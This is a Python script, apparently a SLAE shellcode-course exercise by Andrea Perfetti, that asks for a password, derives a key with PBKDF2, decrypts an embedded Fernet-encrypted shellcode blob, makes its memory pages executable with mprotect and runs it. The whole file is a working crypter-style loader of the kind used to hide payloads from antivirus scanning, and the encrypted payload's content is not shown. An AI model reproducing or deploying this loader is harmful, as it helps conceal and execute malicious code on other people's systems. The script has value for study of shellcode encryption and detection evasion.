########################################
# Filename: Encoder.py
# Author  : Andrea Perfetti
# SLAE ID : SLAE - 1547
#:::::::::::::::::::::::::::::::::::::::
# USAGE
# Add the encoded shellcode in the 'encrypted_payload' variable
# then run the script to decode and execute the payload.
########################################

import string
import base64

from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from ctypes import *


# Update here the shellcode to be decrypted
encrypted_payload = b"5AFI0CL4TPEOOVDDgAAAAABgTmDGpOIMjZNoNCHI6mTco0j71ReDt-4gCvn40LrzMtAUUEVF4kgYB-Tq0G9Iwxbr8hM1JS4a9BThQTPFO1pDuHsqc5L5MWBD3k7CGk8q-2FtENZuyWaq6hs28m2fKmyAyCD7JFNqGTILfm9OhmDbIdJ1Opt2RQziKPASq2JsTe1cv72Jk_kj8KfgpxCJq6_hs1igQYqhAYZ67athV0shJDubxjxUWYiT6kLSC-CclxAHdcQ="


salt = encrypted_payload[:16]
cipher_text = encrypted_payload[16:]

plain_pwd = input("Enter the password: ")

kdf = PBKDF2HMAC(
	algorithm = hashes.SHA256(),
	length = 32,
	salt = salt,
	iterations = 1000,
)
key = base64.urlsafe_b64encode(kdf.derive(plain_pwd.encode()))

cipher_suite = Fernet(key)
shellcode_data = cipher_suite.decrypt(cipher_text)


shellcode=create_string_buffer(shellcode_data)
invoke_shellcode = cast(shellcode, CFUNCTYPE(None))

libc = CDLL('libc.so.6')
pagesize = libc.getpagesize()
address = cast(invoke_shellcode, c_void_p).value
address_page = (address // pagesize) * pagesize

for page_start in range(address_page, address+len(shellcode_data), pagesize):
	assert libc.mprotect(page_start, pagesize, 0x7) == 0
invoke_shellcode()